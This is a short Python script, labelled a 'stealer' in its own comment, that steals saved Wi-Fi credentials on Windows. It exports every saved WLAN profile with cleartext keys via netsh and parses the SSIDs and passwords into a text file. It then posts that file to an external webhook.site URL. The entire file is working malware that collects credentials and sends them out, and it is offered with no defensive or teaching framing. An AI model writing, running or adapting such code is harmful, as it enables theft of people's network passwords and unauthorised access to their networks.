import subprocess
import os
import sys
import requests

#stealer URL
url = 'https://webhook.site/c8299e5d-e51a-4459-bfc0-eaf4339c0d05'
# Create and write initial content to passwords.txt
with open('passwords.txt', "w") as password_file:
    password_file.write("Hello! Here are your passwords:\n\n")

# Execute the command to export WLAN profiles
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()

# Grab the current directory
path = os.getcwd()

# Lists to store wifi data
wifi_files = []
wifi_credentials = []

# Loop through the files in the directory to find wifi XML files
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)

# Loop through the found wifi files to extract SSID and password
for wifi_file in wifi_files:
    ssid = None
    password = None
    with open(wifi_file, 'r') as f:
        for line in f.readlines():
            if '<name>' in line:
                stripped = line.strip()
                ssid = stripped[6:-7]
            if '<keyMaterial>' in line:
                stripped = line.strip()
                password = stripped[13:-14]
    if ssid and password:
        wifi_credentials.append((ssid, password))

# Write the SSID and passwords to passwords.txt
with open("passwords.txt", "a") as f:
    for ssid, password in wifi_credentials:
        f.write(f"SSID: {ssid}\nPassword: {password}\n")

print("Passwords have been written to passwords.txt")

#send
with open('passwords.txt', 'rb') as f:
    requests.post(url,data= f)